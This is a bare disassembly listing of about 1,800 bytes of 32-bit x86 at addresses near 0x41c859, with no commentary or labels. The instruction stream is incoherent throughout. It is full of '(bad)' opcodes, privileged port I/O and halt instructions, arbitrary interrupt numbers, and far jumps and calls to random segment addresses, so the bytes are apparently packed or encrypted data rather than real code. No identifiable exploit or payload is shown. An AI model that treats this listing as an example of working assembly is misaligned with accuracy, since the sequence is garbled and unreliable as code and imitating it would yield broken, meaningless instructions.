  41c859:	xchg   esi,eax
  41c85a:	es xchg ecx,eax
  41c85c:	dec    esp
  41c85d:	stos   BYTE PTR es:[edi],al
  41c85e:	fwait
  41c85f:	shl    BYTE PTR [eax+0x7a19ca4d],cl
  41c865:	enter  0x899d,0xf2
  41c869:	lahf   
  41c86a:	fsubr  QWORD PTR [edi]
  41c86c:	push   esi
  41c86d:	(bad)  
  41c86e:	lock and al,0xbd
  41c871:	ret    0xc96e
  41c874:	push   edi
  41c875:	loop   0x41c8eb
  41c877:	mov    esp,DWORD PTR [ebx+0x21]
  41c87a:	ins    DWORD PTR es:[edi],dx
  41c87b:	fsubr  QWORD PTR [ecx]
  41c87d:	xchg   DWORD PTR [ecx],esp
  41c87f:	push   0xffffff88
  41c881:	xor    al,0xe6
  41c883:	cmc    
  41c884:	or     eax,0x1109b631
  41c889:	pop    ecx
  41c88a:	ins    BYTE PTR es:[edi],dx
  41c88b:	in     al,dx
  41c88c:	push   cs
  41c88d:	pop    esp
  41c88e:	mov    ebx,0x64921f07
  41c893:	mov    esp,0x578d0634
  41c898:	sti    
  41c899:	dec    edi
  41c89a:	inc    ebp
  41c89b:	mov    dh,0x68
  41c89d:	je     0x41c8b5
  41c89f:	rcl    BYTE PTR [edx+0x20],0xa8
  41c8a3:	(bad)  
  41c8a4:	adc    eax,0x989f7377
  41c8a9:	adc    DWORD PTR [ebp-0x7f],ebp
  41c8ac:	les    edx,FWORD PTR [ecx+0x60]
  41c8af:	dec    esi
  41c8b0:	std    
  41c8b1:	in     al,dx
  41c8b2:	aad    0x93
  41c8b4:	add    al,0x7f
  41c8b6:	fidiv  WORD PTR [ebx-0x53ecae02]
  41c8bc:	stc    
  41c8bd:	pop    ecx
  41c8be:	and    BYTE PTR [esi+0x26],cl
  41c8c1:	lahf   
  41c8c2:	inc    esp
  41c8c3:	test   DWORD PTR [eax],esp
  41c8c5:	leave  
  41c8c6:	stos   DWORD PTR es:[edi],eax
  41c8c7:	dec    ecx
  41c8c8:	jno    0x41c91d
  41c8ca:	pushf  
  41c8cb:	sahf   
  41c8cc:	sub    eax,0xd32db452
  41c8d1:	cmc    
  41c8d2:	shl    ebp,1
  41c8d4:	jbe    0x41c87d
  41c8d6:	mov    ebp,0x643dbeae
  41c8db:	cld    
  41c8dc:	data16 div BYTE PTR [esi-0x41441016]
  41c8e3:	dec    ebx
  41c8e4:	and    ah,0x5d
  41c8e7:	rol    DWORD PTR [ebp+0xc617b19],cl
  41c8ed:	dec    ebp
  41c8ee:	outs   dx,BYTE PTR ds:[esi]
  41c8ef:	mov    bl,0x1e
  41c8f1:	jmp    0xce152fef
  41c8f6:	fld    st(1)
  41c8f8:	lea    ecx,[ebx]
  41c8fa:	xchg   ebx,eax
  41c8fb:	sbb    BYTE PTR [esi],dh
  41c8fd:	dec    edi
  41c8fe:	ja     0x41c8f6
  41c900:	mov    WORD PTR [eax+esi*4+0x2add41cd],?
  41c907:	fwait
  41c908:	sub    DWORD PTR [ecx-0x3d],ebp
  41c90b:	sbb    BYTE PTR [eax],al
  41c90d:	cs int 0x13
  41c910:	xor    cl,BYTE PTR [eax-0x66afd15]
  41c916:	sub    eax,0xb40607c8
  41c91b:	ror    BYTE PTR [esi+edx*1+0x27],0x4f
  41c920:	aas    
  41c921:	inc    eax
  41c922:	fist   DWORD PTR [edi+ecx*8+0x31]
  41c926:	das    
  41c927:	xor    BYTE PTR [ebx-0x564b9e13],ch
  41c92d:	gs cmp eax,0x80f9b9ee
  41c933:	fcomp  DWORD PTR [ebx+0x5875a9db]
  41c939:	mov    al,ds:0xaef4e0c6
  41c93e:	sub    bl,dh
  41c940:	loop   0x41c9af
  41c942:	sub    DWORD PTR [ebx+0x2b],esi
  41c945:	push   ss
  41c946:	push   esp
  41c947:	adc    BYTE PTR [eax],0xf7
  41c94a:	(bad)  
  41c94b:	pusha  
  41c94c:	(bad)  
  41c94d:	cmp    al,0x40
  41c94f:	push   0x878b1317
  41c954:	lds    esi,FWORD PTR [esi-0x55]
  41c957:	mov    cl,0x83
  41c959:	test   al,0x9f
  41c95b:	and    al,0x2f
  41c95d:	sub    cl,BYTE PTR [edi+0x3fe46323]
  41c963:	pop    ebx
  41c964:	ss aam 0xdb
  41c967:	int3   
  41c968:	mov    ds:0x79349a83,al
  41c96d:	xor    BYTE PTR [eax],ch
  41c96f:	pop    es
  41c970:	push   0x5e
  41c972:	add    eax,0x60ce8c8
  41c977:	mov    ecx,0x8bdb85a
  41c97c:	xchg   esi,eax
  41c97d:	mov    DWORD PTR [ebp+0x61],eax
  41c980:	jns    0x41c958
  41c982:	jbe    0x41c925
  41c984:	outs   dx,DWORD PTR ds:[esi]
  41c985:	daa    
  41c986:	lock inc edi
  41c988:	mov    ds:0x8700f8,al
  41c98d:	xchg   ebp,eax
  41c98e:	out    0x99,eax
  41c990:	mov    cl,0x88
  41c992:	add    al,0x3c
  41c994:	mov    ebx,0x9553027
  41c999:	dec    edi
  41c99a:	jle    0x41c984
  41c99c:	mov    bh,0xfd
  41c99e:	fdiv   DWORD PTR [edi+edx*4-0x537df9b1]
  41c9a5:	pop    ecx
  41c9a6:	leave  
  41c9a7:	inc    ebp
  41c9a8:	pushf  
  41c9a9:	lock das 
  41c9ab:	pushf  
  41c9ac:	fbstp  TBYTE PTR [edi+ecx*1-0x1c]
  41c9b0:	les    ebx,FWORD PTR [eax]
  41c9b2:	ja     0x41c97a
  41c9b4:	stos   DWORD PTR es:[edi],eax
  41c9b5:	in     al,dx
  41c9b6:	pop    ebp
  41c9b7:	push   ebx
  41c9b8:	jmp    0x8d05:0x54b20c98
  41c9bf:	mov    ds:0x75892197,eax
  41c9c4:	cmp    bh,BYTE PTR [ecx+0x7e]
  41c9c7:	mov    dl,0x9e
  41c9c9:	pop    eax
  41c9ca:	arpl   cx,ax
  41c9cc:	mov    cl,0xe8
  41c9ce:	(bad)  
  41c9d0:	xor    ebx,DWORD PTR [edi+edx*4]
  41c9d3:	or     al,0x96
  41c9d5:	inc    esp
  41c9d6:	cli    
  41c9d7:	call   0x8e2b:0xf7e49711
  41c9de:	icebp  
  41c9df:	not    DWORD PTR [ecx]
  41c9e1:	mov    ds:0x73aeb84e,eax
  41c9e6:	push   ecx
  41c9e7:	pusha  
  41c9e8:	cld    
  41c9e9:	jmp    0x6ec4:0x94fe7ac3
  41c9f0:	push   0x69
  41c9f2:	sub    BYTE PTR [ebp+0x15648387],bh
  41c9f8:	aas    
  41c9f9:	outs   dx,BYTE PTR ds:[esi]
  41c9fa:	adc    dl,BYTE PTR [edi+0x52]
  41c9fd:	pop    esp
  41c9fe:	ins    DWORD PTR es:[edi],dx
  41c9ff:	mov    eax,ds:0xecd38d49
  41ca04:	jle    0x41ca3b
  41ca06:	mov    edi,0x4254ae25
  41ca0b:	scas   al,BYTE PTR es:[edi]
  41ca0c:	sar    BYTE PTR [ecx],1
  41ca0e:	sar    DWORD PTR [ecx+ebx*2],cl
  41ca11:	jecxz  0x41ca44
  41ca13:	adc    dl,BYTE PTR [edi-0x52]
  41ca16:	scas   eax,DWORD PTR es:[edi]
  41ca17:	icebp  
  41ca18:	or     al,BYTE PTR [ebx+edi*4+0x25]
  41ca1c:	ss stos DWORD PTR es:[edi],eax
  41ca1e:	cs push 0x5c031eb8
  41ca24:	in     eax,0x8b
  41ca26:	shr    ecx,cl
  41ca28:	pop    ss
  41ca29:	or     ch,BYTE PTR ds:0x9529a66e
  41ca2f:	push   ebx
  41ca30:	xlat   BYTE PTR ds:[ebx]
  41ca31:	lock cdq 
  41ca33:	mov    eax,ecx
  41ca35:	pop    esp
  41ca36:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca38:	sahf   
  41ca39:	xchg   esi,eax
  41ca3a:	fidiv  DWORD PTR [esi]
  41ca3c:	in     eax,0x7
  41ca3e:	ret    
  41ca3f:	adc    DWORD PTR gs:[esi],ecx
  41ca42:	pop    ebx
  41ca43:	retf   
  41ca44:	(bad)  
  41ca45:	icebp  
  41ca46:	mov    edx,0x8e64b009
  41ca4b:	gs fwait
  41ca4d:	lds    ebp,FWORD PTR [esi+0x4b]
  41ca50:	sub    BYTE PTR [ecx+0x3],ch
  41ca53:	cmp    bh,BYTE PTR [edi]
  41ca55:	dec    edi
  41ca56:	mov    esp,DWORD PTR [ecx-0x75]
  41ca59:	mov    bh,0xcb
  41ca5b:	or     al,0x2f
  41ca5d:	lea    ebx,[eax+ebx*4]
  41ca60:	popf   
  41ca61:	shl    DWORD PTR [esi-0x2f098772],cl
  41ca67:	jae    0x41ca9a
  41ca69:	pop    ebx
  41ca6a:	jno    0x41ca50
  41ca6c:	(bad)
  41ca6f:	hlt    
  41ca70:	push   esi
  41ca71:	cmp    al,0xac
  41ca73:	pop    esp
  41ca74:	test   eax,0xa412b69
  41ca79:	mov    eax,0xafbe21c8
  41ca7e:	(bad)  
  41ca7f:	sub    edi,DWORD PTR [eax+0x39]
  41ca82:	aad    0x6
  41ca84:	or     BYTE PTR [ebx+0x3f],bl
  41ca87:	repz mov cl,0x25
  41ca8a:	adc    eax,0x324de29c
  41ca8f:	inc    edi
  41ca90:	jb     0x41caf1
  41ca92:	xlat   BYTE PTR ds:[ebx]
  41ca93:	cmp    eax,0x99b4086a
  41ca98:	pop    eax
  41ca99:	stos   BYTE PTR es:[edi],al
  41ca9a:	or     esp,DWORD PTR [ebx+0x58df0d0b]
  41caa0:	out    dx,eax
  41caa1:	out    0x89,al
  41caa3:	jae    0x41cb07
  41caa5:	out    dx,eax
  41caa6:	pop    eax
  41caa7:	mov    al,0x56
  41caa9:	adc    BYTE PTR [edi],dl
  41caab:	les    ebx,FWORD PTR [ecx]
  41caad:	addr16 mov ds:0xcc62,eax
  41cab1:	mov    ch,0xca
  41cab3:	cmp    eax,ecx
  41cab5:	les    eax,FWORD PTR [ebx-0x1b]
  41cab8:	xlat   BYTE PTR ds:[ebx]
  41cab9:	xor    al,0x95
  41cabb:	add    eax,0x65a5be74
  41cac0:	std    
  41cac1:	popa   
  41cac2:	loopne 0x41cb13
  41cac4:	clc    
  41cac5:	fisub  WORD PTR [esi-0x73]
  41cac8:	cmp    al,0x77
  41caca:	xchg   esi,eax
  41cacb:	mov    DWORD PTR [eax+0x270dccf9],ecx
  41cad1:	and    bh,ah
  41cad3:	addr16 js 0x41cad7
  41cad6:	into   
  41cad7:	mov    edi,0xf414b06a
  41cadc:	jecxz  0x41cab9
  41cade:	or     DWORD PTR [eax-0x7d3993d1],edi
  41cae4:	push   cs
  41cae5:	and    eax,0x92ddab54
  41caea:	ja     0x41cad9
  41caec:	cmc    
  41caed:	sbb    eax,0x12e1cc66
  41caf2:	and    al,0xab
  41caf4:	lds    edx,FWORD PTR [ecx+0x4a3e8a13]
  41cafa:	mov    esp,0xdc208fea
  41caff:	aad    0x44
  41cb01:	fstp   DWORD PTR [edi-0x31e68535]
  41cb07:	push   cs
  41cb08:	inc    ebp
  41cb09:	xor    esi,DWORD PTR [ecx]
  41cb0b:	mov    dl,BYTE PTR [edx+0x988e00f]
  41cb11:	xchg   ebp,eax
  41cb12:	mov    edi,0x1ea01493
  41cb17:	xor    eax,0x38f1f4c3
  41cb1c:	push   0xffffffca
  41cb1e:	cmp    eax,eax
  41cb20:	aam    0x50
  41cb22:	jl     0x41cb90
  41cb24:	or     DWORD PTR [edi+0x27718d50],edx
  41cb2a:	add    eax,0xb58a1d0d
  41cb2f:	into   
  41cb30:	mov    eax,ds:0xf061f2c4
  41cb35:	stos   DWORD PTR es:[edi],eax
  41cb36:	mov    ebx,fs
  41cb38:	leave  
  41cb39:	jb     0x41cafe
  41cb3b:	ss stc 
  41cb3d:	dec    esp
  41cb3e:	gs sub al,0xb
  41cb41:	ret    
  41cb42:	cmp    bl,dh
  41cb44:	jno    0x41cb7f
  41cb46:	push   edi
  41cb47:	xor    eax,0x624345bd
  41cb4c:	int    0xb9
  41cb4e:	pop    esp
  41cb4f:	dec    edx
  41cb50:	xchg   DWORD PTR [eax],eax
  41cb52:	or     esi,DWORD PTR [esi]
  41cb54:	int    0xed
  41cb56:	cmp    al,0x72
  41cb58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb59:	pop    esi
  41cb5a:	icebp  
  41cb5b:	ret    
  41cb5c:	jmp    0x947f4f78
  41cb61:	fs int 0xb8
  41cb64:	mov    dh,0xa8
  41cb66:	xor    eax,DWORD PTR [eax]
  41cb68:	dec    esi
  41cb69:	in     eax,0x9e
  41cb6b:	sbb    cl,BYTE PTR [edi+0x19fd773a]
  41cb71:	loop   0x41cbdf
  41cb73:	mov    ebx,0x5e4da5c6
  41cb78:	xchg   edx,eax
  41cb79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb7a:	jbe    0x41cbbb
  41cb7c:	adc    al,0xfb
  41cb7e:	inc    eax
  41cb7f:	out    0x7f,eax
  41cb81:	arpl   WORD PTR [edx],ax
  41cb83:	fldenv [ecx]
  41cb85:	out    dx,al
  41cb86:	cdq    
  41cb87:	pusha  
  41cb88:	sub    eax,0xe2b5caae
  41cb8d:	ror    BYTE PTR [esi],0x8b
  41cb90:	shl    DWORD PTR [edx+0x1c0bcdf0],0xd5
  41cb97:	ror    cl,cl
  41cb99:	(bad)  
  41cb9a:	mov    dl,0xd9
  41cb9c:	addr16 push cs
  41cb9e:	push   ds
  41cb9f:	add    ebx,DWORD PTR [ebp-0x20]
  41cba2:	add    ebp,DWORD PTR [esi]
  41cba4:	bound  ecx,QWORD PTR [eax-0x47]
  41cba7:	outs   dx,DWORD PTR ds:[esi]
  41cba8:	in     al,dx
  41cba9:	sbb    ebx,0x78ef61d2
  41cbaf:	push   eax
  41cbb0:	adc    bl,BYTE PTR [ecx]
  41cbb2:	mov    al,BYTE PTR fs:[ebx+0x43]
  41cbb6:	(bad)  
  41cbb7:	inc    esp
  41cbb8:	inc    edi
  41cbb9:	cmp    al,0x50
  41cbbb:	test   al,0x4a
  41cbbd:	mov    eax,ds:0x7aa26bd6
  41cbc2:	xchg   DWORD PTR [ebx-0x16fc90ec],edi
  41cbc8:	inc    ecx
  41cbc9:	dec    ebp
  41cbca:	mov    edi,0x2ae35eba
  41cbcf:	and    eax,0x1ad408e9
  41cbd4:	outs   dx,DWORD PTR ds:[esi]
  41cbd5:	inc    ebx
  41cbd6:	jmp    0x41cc03
  41cbd8:	nop
  41cbd9:	ins    DWORD PTR es:[edi],dx
  41cbda:	mov    dl,0xba
  41cbdc:	pop    es
  41cbdd:	push   esp
  41cbde:	jno    0x41cbe4
  41cbe0:	jge    0x41cbea
  41cbe2:	xor    DWORD PTR [edi],ebx
  41cbe4:	jp     0x41cc29
  41cbe6:	mov    bh,BYTE PTR [ecx-0x60113e00]
  41cbec:	jecxz  0x41cbf1
  41cbee:	in     eax,dx
  41cbef:	inc    ebx
  41cbf0:	or     dl,BYTE PTR [esi+0x6128c88d]
  41cbf6:	out    dx,al
  41cbf7:	loope  0x41cb8c
  41cbf9:	mov    dh,0x43
  41cbfb:	mov    ebx,0x89bf369f
  41cc00:	gs call 0xe20d320e
  41cc06:	sub    dl,BYTE PTR [esp+ebp*4]
  41cc09:	rcl    BYTE PTR [eax],0x75
  41cc0c:	dec    BYTE PTR ds:0x99038536
  41cc12:	inc    esi
  41cc13:	inc    esi
  41cc14:	sub    dh,dh
  41cc16:	in     al,dx
  41cc17:	pop    eax
  41cc18:	iret   
  41cc19:	jp     0x41cbad
  41cc1b:	jo     0x41cc45
  41cc1d:	repnz fwait
  41cc1f:	push   esi
  41cc20:	fisttp WORD PTR [edx-0x65763d9]
  41cc26:	push   esi
  41cc27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc28:	inc    ebp
  41cc29:	jns    0x41cbba
  41cc2b:	push   0xd0c90422
  41cc30:	data16 stos BYTE PTR es:[edi],al
  41cc32:	test   al,0xbf
  41cc34:	mov    ch,0x7f
  41cc36:	or     eax,0xa609204e
  41cc3b:	add    al,0x89
  41cc3d:	inc    ebx
  41cc3e:	jmp    0x47a665c9
  41cc43:	lods   al,BYTE PTR ds:[esi]
  41cc44:	pop    edx
  41cc45:	in     eax,0x77
  41cc47:	in     al,dx
  41cc48:	rcl    DWORD PTR es:[ecx-0x2f],0xf
  41cc4d:	scas   al,BYTE PTR es:[edi]
  41cc4e:	loope  0x41cc4a
  41cc50:	addr16 retf 0x3648
  41cc54:	jecxz  0x41cc67
  41cc56:	aam    0xbc
  41cc58:	cwde   
  41cc59:	lock (bad) [ebp-0x3a0d2452]
  41cc60:	dec    bx
  41cc62:	mov    DWORD PTR [ecx+0x54d1635a],ecx
  41cc68:	pop    ecx
  41cc69:	jbe    0x41cc01
  41cc6b:	pop    ebp
  41cc6c:	jecxz  0x41ccad
  41cc6e:	es mov dl,0x29
  41cc71:	sub    al,0x61
  41cc73:	push   cs
  41cc74:	and    al,0xb
  41cc76:	push   ss
  41cc77:	mov    cl,0xae
  41cc79:	(bad)  
  41cc7b:	jbe    0x41cc3a
  41cc7d:	mov    bh,BYTE PTR [ebx+edx*4]
  41cc80:	cmp    esi,DWORD PTR [ecx-0x6efca259]
  41cc86:	nop
  41cc87:	jnp    0x41ccd6
  41cc89:	xchg   BYTE PTR ds:0x418bb422,dl
  41cc8f:	imul   BYTE PTR [esi]
  41cc91:	mov    edx,0x1f11226e
  41cc96:	ja     0x41cc9c
  41cc98:	push   esi
  41cc99:	mov    eax,DWORD PTR [ebx]
  41cc9b:	sub    BYTE PTR [ecx],ch
  41cc9d:	dec    ebp
  41cc9e:	or     eax,0xd7fbd10e
  41cca3:	gs (bad) 
  41cca5:	jno    0x41cc36
  41cca7:	imul   ecx,DWORD PTR [ecx],0xbae91dfc
  41ccad:	and    ebx,0x88a27570
  41ccb3:	push   0x7a
  41ccb5:	sub    al,0x55
  41ccb7:	push   0xffffffa6
  41ccb9:	or     DWORD PTR [ebx+esi*8-0xe],0x28960a05
  41ccc1:	ror    DWORD PTR [ecx-0x1cd1bb72],0x80
  41ccc8:	rcl    DWORD PTR ds:0x49ed5ccd,cl
  41ccce:	mov    bh,0x6b
  41ccd0:	getsec 
  41ccd2:	popf   
  41ccd3:	aad    0x3f
  41ccd5:	test   eax,0x87ae08e
  41ccda:	data16 out dx,al
  41ccdc:	(bad)  
  41ccdd:	fisubr DWORD PTR [ebx-0x636ecfd1]
  41cce3:	mov    DWORD PTR ds:0x4eec539e,edx
  41cce9:	inc    ebp
  41ccea:	mov    ch,0x6d
  41ccec:	push   0x1b
  41ccee:	push   ss
  41ccef:	test   BYTE PTR [esi],0x2f
  41ccf2:	popa   
  41ccf3:	rcr    DWORD PTR [edi+ebp*4],1
  41ccf6:	aas    
  41ccf7:	sar    DWORD PTR [eax-0x2e],cl
  41ccfa:	add    bl,BYTE PTR [edi-0x732e3478]
  41cd00:	stos   DWORD PTR es:[edi],eax
  41cd01:	icebp  
  41cd02:	or     edx,DWORD PTR [ebx+0x6e]
  41cd05:	pop    esp
  41cd06:	adc    DWORD PTR [ecx+0x562d7526],ebp
  41cd0c:	test   eax,0xe518e928
  41cd11:	repz pop es
  41cd13:	inc    edi
  41cd14:	sub    BYTE PTR [esi+0x43],ah
  41cd17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd18:	sub    eax,0x7c3c98ae
  41cd1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd1e:	xor    al,0x1e
  41cd20:	jp     0x41cd9e
  41cd22:	out    dx,al
  41cd23:	outs   dx,BYTE PTR ds:[esi]
  41cd25:	movhps QWORD PTR [ebp-0x54],xmm2
  41cd29:	sub    ch,bh
  41cd2b:	push   cs
  41cd2c:	mov    al,ds:0xe9d8a1fd
  41cd31:	ror    DWORD PTR [eax-0x5],1
  41cd34:	ret    
  41cd35:	inc    esi
  41cd36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd37:	jb     0x41ccc8
  41cd39:	mov    ah,0xdc
  41cd3b:	dec    esi
  41cd3c:	dec    esp
  41cd3d:	fwait
  41cd3e:	inc    esp
  41cd3f:	pop    ds
  41cd40:	pushf  
  41cd41:	pushf  
  41cd42:	cmp    ah,BYTE PTR [ecx]
  41cd44:	push   ss
  41cd45:	jne    0x41cdaf
  41cd47:	dec    esi
  41cd48:	mov    DWORD PTR [esi-0x2c],esi
  41cd4b:	pop    esi
  41cd4c:	inc    ebx
  41cd4d:	pop    ss
  41cd4e:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41cd50:	mov    ?,WORD PTR [edx-0x111ebdb4]
  41cd56:	dec    eax
  41cd57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd58:	add    al,0x2e
  41cd5a:	int    0x52
  41cd5c:	jne    0x41cdb2
  41cd5e:	std    
  41cd5f:	pop    esp
  41cd60:	ret    0x8465
  41cd63:	mov    al,ds:0x7ef7ae29
  41cd68:	sti    
  41cd69:	mov    ecx,0x46821797
  41cd6e:	call   0x62ae231d
  41cd73:	cmp    DWORD PTR [eax-0x2dc115c6],eax
  41cd79:	int3   
  41cd7a:	mov    cl,0x37
  41cd7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd7d:	mov    ?,WORD PTR [eax]
  41cd7f:	cmc    
  41cd80:	xor    DWORD PTR [edx-0x5c],esp
  41cd83:	pop    ebx
  41cd84:	call   0xb799:0x3b1c2fff
  41cd8b:	adc    cl,BYTE PTR [edi+eax*1-0x34]
  41cd8f:	jb     0x41cd54
  41cd91:	mov    ebx,0xf3f577be
  41cd96:	mov    ah,0x9d
  41cd98:	inc    edi
  41cd99:	jmp    0x53d5:0x374e9197
  41cda0:	add    al,BYTE PTR [edx-0x2e]
  41cda3:	mov    edx,0x59554860
  41cda8:	jge    0x41cd98
  41cdaa:	jle    0x41ce2b
  41cdac:	stos   DWORD PTR es:[edi],eax
  41cdad:	loop   0x41cd43
  41cdaf:	jb     0x41cd40
  41cdb1:	fild   WORD PTR [edi]
  41cdb3:	fisttp WORD PTR [ebx-0x40d67824]
  41cdb9:	cmp    ch,BYTE PTR [ebx+0x70]
  41cdbc:	mov    ch,0x41
  41cdbe:	push   eax
  41cdbf:	imul   esi,DWORD PTR [esi+ebx*8+0x3dddf304],0x41
  41cdc7:	fnstcw WORD PTR [ebp+0x58]
  41cdca:	adc    BYTE PTR [eax+0x667a301b],dl
  41cdd0:	dec    esi
  41cdd1:	lahf   
  41cdd2:	add    al,0x49
  41cdd4:	inc    esi
  41cdd5:	jns    0x41cde2
  41cdd7:	(bad)  
  41cdd8:	stos   DWORD PTR es:[edi],eax
  41cdd9:	(bad)  
  41cdda:	jnp    0x41ce40
  41cddc:	jno    0x41cda1
  41cdde:	je     0x41cd71
  41cde0:	pop    esi
  41cde1:	xchg   ecx,eax
  41cde2:	push   0x72
  41cde4:	das    
  41cde5:	(bad)  
  41cde6:	xchg   ecx,eax
  41cde7:	lock mov cx,0xf5a4
  41cdec:	inc    esi
  41cded:	enter  0xf3a2,0x53
  41cdf1:	pushf  
  41cdf2:	sbb    BYTE PTR [edi+0xa],al
  41cdf5:	ss daa 
  41cdf7:	retf   0xa9cf
  41cdfa:	xor    al,0xbd
  41cdfc:	dec    edx
  41cdfd:	repz cdq 
  41cdff:	lods   al,BYTE PTR ds:[esi]
  41ce00:	lahf   
  41ce01:	test   DWORD PTR [ebx+0x4e],ebx
  41ce04:	cwde   
  41ce05:	(bad)  
  41ce06:	sub    edi,esi
  41ce08:	jmp    0xa7f80661
  41ce0d:	sbb    BYTE PTR ds:0xccc6f65a,0xfb
  41ce14:	mov    dh,0x76
  41ce16:	push   edx
  41ce17:	ror    BYTE PTR [ebx+0x67],0xe
  41ce1b:	adc    al,0xc6
  41ce1d:	push   cs
  41ce1e:	sbb    BYTE PTR ds:0x8250e213,0xcd
  41ce25:	in     al,dx
  41ce26:	dec    ecx
  41ce27:	rcl    BYTE PTR [esi],0x75
  41ce2a:	mov    edx,0x49582937
  41ce2f:	loopne 0x41cea1
  41ce31:	xchg   edx,eax
  41ce32:	stc    
  41ce33:	and    DWORD PTR [ecx*8-0x1652b1a5],eax
  41ce3a:	and    BYTE PTR [ecx+0x4c95b1a0],al
  41ce40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce41:	shr    BYTE PTR [ebx+0x57],1
  41ce44:	in     eax,dx
  41ce45:	add    ah,BYTE PTR [esi-0x3ad1771a]
  41ce4b:	xchg   ebx,eax
  41ce4c:	ror    DWORD PTR [ecx+0x69d93095],0xac
  41ce53:	hlt    
  41ce54:	sar    BYTE PTR [edi],cl
  41ce56:	div    DWORD PTR cs:[eax+0x5ec44759]
  41ce5d:	rcr    DWORD PTR [ebp-0x5c],cl
  41ce60:	(bad)  
  41ce61:	lock dec eax
  41ce63:	(bad)  [esp+esi*2]
  41ce66:	xchg   edi,eax
  41ce67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce68:	xchg   ecx,eax
  41ce69:	jno    0x41ce35
  41ce6b:	or     esp,ecx
  41ce6d:	xlat   BYTE PTR ds:[ebx]
  41ce6e:	add    al,0x87
  41ce70:	push   edx
  41ce71:	pop    ebp
  41ce72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce73:	bound  ebx,QWORD PTR [edi]
  41ce75:	push   eax
  41ce76:	sbb    al,0x78
  41ce78:	mov    ah,0xaf
  41ce7a:	adc    esp,DWORD PTR [edx+0x6b]
  41ce7d:	add    edx,edi
  41ce7f:	jbe    0x41ce97
  41ce81:	fcomip st,st(4)
  41ce83:	inc    esp
  41ce84:	sub    BYTE PTR [eax-0x46],bl
  41ce87:	cs push es
  41ce89:	mov    ds:0x621d3d56,eax
  41ce8e:	push   es
  41ce8f:	mov    esp,ebp
  41ce91:	jecxz  0x41ce35
  41ce93:	test   al,0xa
  41ce95:	adc    ebx,0xffffff84
  41ce98:	ret    0xf4dd
  41ce9b:	push   esi
  41ce9c:	lds    eax,FWORD PTR [eax-0x75]
  41ce9f:	repz popa 
  41cea1:	aad    0x0
  41cea3:	push   ebp
  41cea4:	pusha  
  41cea5:	jnp    0x41ce27
  41cea7:	imul   esi,DWORD PTR [edx+0x77],0xd0564528
  41ceae:	xor    DWORD PTR [edi+eax*4-0x5d950684],ebx
  41ceb5:	xlat   BYTE PTR ds:[ebx]
  41ceb6:	jb     0x41ce6f
  41ceb8:	nop
  41ceb9:	xchg   esp,eax
  41ceba:	add    al,0x8
  41cebc:	das    
  41cebd:	popa   
  41cebe:	fild   DWORD PTR [ebp-0x64684746]
  41cec4:	test   BYTE PTR [ebx-0x48],0x38
  41cec8:	mov    ecx,0xf6826cdf
  41cecd:	push   ebp
  41cece:	dec    ebx
  41cecf:	dec    ebp
  41ced0:	shl    BYTE PTR [eax-0x2],1
  41ced3:	aaa    
  41ced4:	add    al,0x83
  41ced6:	mov    esi,0x45a0ef99
  41cedb:	adc    esp,eax
  41cedd:	aas    
  41cede:	mov    ebp,0x9cab10fa
  41cee3:	fwait
  41cee4:	mov    DWORD PTR [edi+eax*8-0x1e],ebx
  41cee8:	ficomp DWORD PTR [bx+si]
  41ceeb:	mov    bh,0xd9
  41ceed:	(bad)  
  41ceee:	test   al,0x23
  41cef0:	cdq    
  41cef1:	andps  xmm6,xmm2
  41cef4:	xchg   edi,eax
  41cef5:	mov    al,ds:0x283fb1df
  41cefa:	and    ebx,edi
  41cefc:	lods   al,BYTE PTR ds:[esi]
  41cefd:	pop    es
  41cefe:	icebp  
  41ceff:	jl     0x41cf59
  41cf01:	rol    BYTE PTR [ebx-0x624394cc],0x79
  41cf08:	pop    esi
  41cf09:	call   0x7884:0x7b849742
  41cf10:	dec    ecx
  41cf11:	mov    cl,0x1d
  41cf13:	mov    bh,0x6d
  41cf15:	and    ah,BYTE PTR [edi+0x28]
  41cf18:	adc    al,0x65
  41cf1a:	xchg   esi,eax
  41cf1b:	xchg   esp,eax
  41cf1c:	mov    ds:0x21486131,eax
  41cf21:	xor    BYTE PTR [ebx+0x7f838ec0],ah
  41cf27:	aad    0xb3
  41cf29:	dec    eax
  41cf2a:	ins    BYTE PTR es:[edi],dx
  41cf2b:	jmp    0x3258:0x8b0d1c4c
  41cf32:	lds    edi,FWORD PTR [ebp+0x3f]
  41cf35:	and    esp,0x5
  41cf38:	adc    dl,BYTE PTR [eax+0x33]
  41cf3b:	popa   
  41cf3c:	into   
  41cf3d:	pop    es
  41cf3e:	jl     0x41cf42
  41cf40:	nop
  41cf41:	xlat   BYTE PTR ds:[ebx]
  41cf42:	das    
  41cf43:	cli    
  41cf44:	aam    0x5f
  41cf46:	sub    BYTE PTR [ecx],ah
  41cf48:	test   eax,0xb96a6761
  41cf4e:	ret    0x29b2
  41cf51:	stos   BYTE PTR es:[edi],al
  41cf52:	loop   0x41cf71
  41cf54:	push   es
  41cf55:	mov    edx,0xab4a0482
  41cf5a:	xchg   ebp,eax
  41cf5b:	dec    edx
  41cf5c:	loop   0x41cf55
  41cf5e:	data16 mov BYTE PTR [edx+0x10062c12],dl
  41cf65:	jb     0x41cfb7
  41cf67:	jbe    0x41cf25
  41cf69:	rcl    BYTE PTR [edi-0x6],cl
  41cf6c:	adc    eax,0x852efd90
  41cf71:	mov    DWORD PTR [ecx-0x51],ecx
  41cf74:	int    0x32
  41cf76:	loop   0x41cfef
  41cf78:	call   0xe9bbdab1
  41cf7d:	xchg   esi,eax
  41cf7e:	int    0xb7
  41cf80:	adc    al,0x3d
  41cf82:	int3   
  41cf83:	imul   edi,DWORD PTR [ebx+ebp*1-0x2de69d41],0x70
  41cf8b:	sub    BYTE PTR [ebp-0x50],ah
  41cf8e:	(bad)  
  41cf8f:	pop    ds
  41cf90:	xchg   edi,eax
